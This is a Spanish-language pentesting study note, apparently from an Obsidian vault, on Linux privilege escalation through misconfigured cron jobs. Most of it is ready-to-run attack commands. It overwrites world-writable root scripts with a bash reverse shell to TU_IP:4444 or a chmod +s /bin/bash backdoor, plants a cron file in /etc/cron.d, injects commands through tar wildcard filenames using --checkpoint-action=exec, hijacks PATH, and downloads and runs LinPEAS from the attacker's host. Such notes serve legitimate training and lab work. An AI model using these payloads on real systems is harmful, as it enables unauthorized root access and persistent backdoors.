# 🚀 Escalada de Privilegios por Cron Jobs
## 📚 ¿Qué es un Cron Job?

Los **Cron Jobs** son tareas programadas en sistemas Linux. Si una tarea es ejecutada por el usuario `root` y el script o el entorno donde se ejecuta es vulnerable, podemos obtener acceso total al sistema.

- Se configura en archivos como `/etc/crontab`.
- Lo importante: **Si la tarea la ejecuta `root` y tiene un fallo, nosotros podemos aprovecharlo.**
## FASE 1: 🔍 ENUMERACIÓN
El objetivo es encontrar tareas automáticas que corran con privilegios elevados.
### Paso 1: Inspección de Archivos del Sistema
- **Crontab principal:** `cat /etc/crontab`
- **Tablas de usuario:** `ls -la /var/spool/cron/crontabs/`

**¿Qué buscas?**

- Líneas que se ejecuten como `root`.
- Scripts (rutas como `/home/algo/script.sh` o `/usr/local/bin/backup`).
- Directorios sospechosos como `/tmp` (porque suele ser escribible por todos).

### Paso 2: Mira las carpetas de tareas
Los cron jobs también se pueden guardar en carpetas.

- `ls -la /etc/cron.d/`
- `ls -la /etc/cron.hourly/`
- `ls -la /etc/cron.daily/`
- `ls -la /etc/cron.weekly/`
- `ls -la /etc/cron.monthly/`

### Paso 3: Comando "busca todo"
- `grep -rnw /etc -e "cron" 2>/dev/null`

Tambien, puedes usar [[LinPEAS]]. Lo subes a la máquina, lo ejecutas y él te marca en color los caminos fáciles.

En tu máquina (atacante)
- `python3 -m http.server 80

En la máquina víctima
- `wget http://TU_IP/linpeas.sh`
- `chmod +x linpeas.sh`
- `./linpeas.sh -a` (el flag `-a` realiza un análisis profundo).

Busca las secciones resaltadas en **Rojo/Amarillo** dentro del apartado "Cron jobs".
## FASE 2: 🧪 ANÁLISIS
Ya tenemos una lista de tareas. Ahora vamos a ver si tienen "puntos débiles".

### El "Checklist" (lo que hay que comprobar)
Cuando veas un script que se ejecuta como root:

1. **¿Puedo escribir en el script?**
2. **¿Puedo escribir en la carpeta donde está el script?** (Aunque el script sea de root, si la carpeta es mía, puedo borrar el script y poner el mío).
3. **¿El script usa comodines (`*`) en una carpeta que controlo?**
	- Busca líneas como: tar -czf /tmp/backup.tar.gz /var/www/html/*
	- Si /var/www/html/ es tuya, ¡bingo!
4. **¿El script usa rutas relativas?**
	- Busca líneas como: `* * * * * root mi_script.sh`  (en lugar de /usr/bin/mi_script.sh)
	- Luego mira la línea de arriba:  PATH=/home/pedro:/bin:/usr/bin
	- Si /home/pedro está al principio del PATH, podemos engañar al sistema. (PATH Hijacking)

## FASE 3: 💥 EXPLOTACIÓN
### Caso 1: El Script es "World-Writable" (Puede escribir todo el mundo)
**Situación:** El script `/usr/local/bin/backup.sh` tiene permisos `777` y lo ejecuta ``root``.
**Ataque:** Vamos a meter nuestro propio código dentro.

1. **Sobrescribe el script** con un payload que te dé acceso.
	- Opción A (SUID Bash)
		`echo '#!/bin/bash' > /usr/local/bin/backup.sh`
		`echo 'chmod +s /bin/bash' >> /usr/local/bin/backup.sh`
	- Opción B (Reverse Shell) - Necesitas tener un listener en tu máquina
		`echo '#!/bin/bash' > /usr/local/bin/backup.sh`
		`echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' >> /usr/local/bin/backup.sh`
2. **Espera el tiempo que tarde el cron.**
3. **Si usaste la opción A**, ejecuta:
	- `/bin/bash -p`

### Caso 2: La Carpeta de Cron es Escribible
**Situación:** Puedes escribir en `/etc/cron.d/`.
**Ataque:** Vamos a crear nuestro propio archivo de tarea.

1. **Crea un nuevo archivo** en esa carpeta.
```
cat > /etc/cron.d/payload << EOF
# Se ejecuta cada minuto como root
* * * * * root chmod +s /bin/bash
EOF
```
2. **Espera un minuto.**
3. Lanza la bash mágica:
	- `/bin/bash -p`

### Caso 3: Inyección de Comodines (Wildcards)
**Situación:** Hay un comando como `tar -czf backup.tar.gz /carpeta/*` y `/carpeta/` es nuestra.
**Ataque:** Vamos a crear archivos con nombres que engañen a `tar`.

1. **Ve a la carpeta que se está comprimiendo.**
2. **Crea el script malicioso** que ejecutará `tar` con poderes de root.
```
cat > shell.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
EOF
chmod +x shell.sh
```
3. **Crea los archivos "trampa".** 
	- `touch -- "--checkpoint=1"`
	- `touch -- "--checkpoint-action=exec=shell.sh"`
	(El `--` es para que el comando `touch` no interprete los guiones como opciones).
	Cuando `tar` pase por esos archivos, interpretará los nombres como comandos y ejecutará tu script.
4.  **Espera.**
5. Ejecuta la bash:
	- `/tmp/rootbash -p`

### Caso 4: Secuestro de PATH (PATH Hijacking)
**Situación:** En `/etc/crontab` hay una línea como `PATH=/tmp:/bin:/usr/bin` y luego ejecuta `* * * * * root comando_corto` (sin ruta completa).
**Ataque:** Creamos un programa falso llamado `comando_corto` en `/tmp`.
1. **Crea un ejecutable** en el primer directorio del PATH (`/tmp` en este ejemplo).
```
cat > /tmp/comando_corto << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x /tmp/comando_corto
```
2. **Espera.**
3. Cuando el cron ejecute `comando_corto`, ejecutará _nuestro_ script, y pondrá el SUID a la bash.
4. Lanza:
	-  `/bin/bash -p`
## 🚩 Notas de Post-Explotación (SUID Bash)

Cuando logras que el cron ejecute `chmod +s /bin/bash`, has creado una "puerta trasera" de privilegios.

- **Para entrar:** `/bin/bash -p` 

  > [!note] **¿Por qué el flag `-p`?** La mayoría de las shells modernas detectan si su UID real es distinto al efectivo y "sueltan" los privilegios de root por seguridad. El flag `-p` (privileged) obliga a la shell a mantener esos privilegios de `root`.

- **Para limpiar:** Una vez seas root, no olvides quitar el bit SUID: `chmod -s /bin/bash`

---
**Navegación:**
- Volver a: [[3.5 Escalada de Privilegios en Linux]]
- [[Técnicas]]